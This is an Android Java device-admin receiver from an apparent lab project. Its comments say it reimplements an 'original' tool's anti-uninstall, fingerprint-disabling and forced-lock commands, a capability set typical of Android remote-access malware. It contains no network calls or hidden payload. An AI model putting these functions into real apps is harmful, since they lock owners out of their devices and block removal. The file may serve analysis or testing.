package com.ref.labagent;

import android.app.Activity;
import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;

/**
 * 设备管理员接收器：防卸载（antiDeleteOn/Off）、禁用生物识别、强制锁屏。
 * 原版这几个动作就是靠 device admin 做的。
 */
public class AdminReceiver extends DeviceAdminReceiver {

    public static ComponentName cn(Context c) {
        return new ComponentName(c, AdminReceiver.class);
    }

    public static boolean isActive(Context c) {
        DevicePolicyManager d = (DevicePolicyManager) c.getSystemService(Context.DEVICE_POLICY_SERVICE);
        return d != null && d.isAdminActive(cn(c));
    }

    public static void request(Context c) {
        try {
            Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn(c));
            i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "用于设备管理（防卸载/远程锁定）");
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            c.startActivity(i);
        } catch (Throwable ignored) {
        }
    }

    public static String remove(Context c) {
        try {
            DevicePolicyManager d = (DevicePolicyManager) c.getSystemService(Context.DEVICE_POLICY_SERVICE);
            if (d != null && d.isAdminActive(cn(c))) {
                d.removeActiveAdmin(cn(c));
                return "removed";
            }
            return "not-active";
        } catch (Throwable t) {
            return "err:" + t;
        }
    }

    /** 是否本机 device owner（biometric 这类策略要求 device owner 才能生效） */
    public static boolean isOwner(Context c) {
        try {
            DevicePolicyManager d = (DevicePolicyManager) c.getSystemService(Context.DEVICE_POLICY_SERVICE);
            return d != null && d.isDeviceOwnerApp(c.getPackageName());
        } catch (Throwable t) {
            return false;
        }
    }

    /** 清掉 device owner（device owner 只能由应用自己清 —— dpm 命令行清不掉） */
    public static String clearOwner(Context c) {
        try {
            DevicePolicyManager d = (DevicePolicyManager) c.getSystemService(Context.DEVICE_POLICY_SERVICE);
            if (d == null) {
                return "no-dpm";
            }
            if (!d.isDeviceOwnerApp(c.getPackageName())) {
                return "not-owner";
            }
            d.clearDeviceOwnerApp(c.getPackageName());
            return "cleared";
        } catch (Throwable t) {
            return "err:" + t;
        }
    }

    /** 关掉生物识别（原版 disableBiometric） */
    public static String setBiometric(Context c, boolean disabled) {
        try {
            DevicePolicyManager d = (DevicePolicyManager) c.getSystemService(Context.DEVICE_POLICY_SERVICE);
            if (d == null || !d.isAdminActive(cn(c))) {
                return "no-admin";
            }
            d.setKeyguardDisabledFeatures(cn(c), disabled
                    ? DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT
                    : DevicePolicyManager.KEYGUARD_DISABLE_FEATURES_NONE);
            return "ok";
        } catch (Throwable t) {
            return "err:" + t;
        }
    }

    /** 强制锁屏（原版 smartUnlock / admLock） */
    public static String lock(Context c) {
        try {
            DevicePolicyManager d = (DevicePolicyManager) c.getSystemService(Context.DEVICE_POLICY_SERVICE);
            if (d == null || !d.isAdminActive(cn(c))) {
                return "no-admin";
            }
            d.lockNow();
            return "ok";
        } catch (Throwable t) {
            return "err:" + t;
        }
    }

    @Override
    public void onEnabled(Context c, Intent i) { super.onEnabled(c, i); }

    @Override
    public void onDisabled(Context c, Intent i) { super.onDisabled(c, i); }
}
